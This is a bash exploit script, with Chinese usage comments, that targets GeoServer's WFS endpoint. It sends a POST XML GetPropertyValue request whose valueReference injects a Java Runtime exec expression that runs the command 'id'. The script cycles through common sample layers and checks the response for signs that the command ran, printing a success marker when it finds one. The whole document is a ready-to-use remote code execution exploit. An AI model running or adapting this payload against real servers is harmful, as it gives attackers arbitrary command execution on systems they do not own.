#!/bin/bash
# GeoServer RCE via POST XML
# 用法: rce_post_xml.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

echo "=== GeoServer POST XML RCE ==="

FOUND=false
for base in "${ENDPOINT}/geoserver" "${ENDPOINT}"; do
  for layer in "sf:archsites" "topp:states" "tiger:poi"; do
    result=$(curl -s -X POST "${base}/wfs" \
      -H "Content-Type: application/xml" \
      -d "<wfs:GetPropertyValue service='WFS' version='2.0.0'
           xmlns:sf='http://cite.opengeospatial.org/gmlsf'
           xmlns:fes='http://www.opengis.net/fes/2.0'
           xmlns:wfs='http://www.opengis.net/wfs/2.0'>
        <wfs:Query typeNames='${layer}'/>
        <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'id')</wfs:valueReference>
      </wfs:GetPropertyValue>" \
      --max-time 15 2>/dev/null)
    if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
      echo "[+] POST 命中: ${base}/wfs layer=${layer}"
      echo "$result"
      echo "GEOSERVER_RCE_SUCCESS"
      FOUND=true
      break 2
    fi
  done
done

if [ "$FOUND" = false ]; then
  echo "POST_ALL_FAILED"
fi
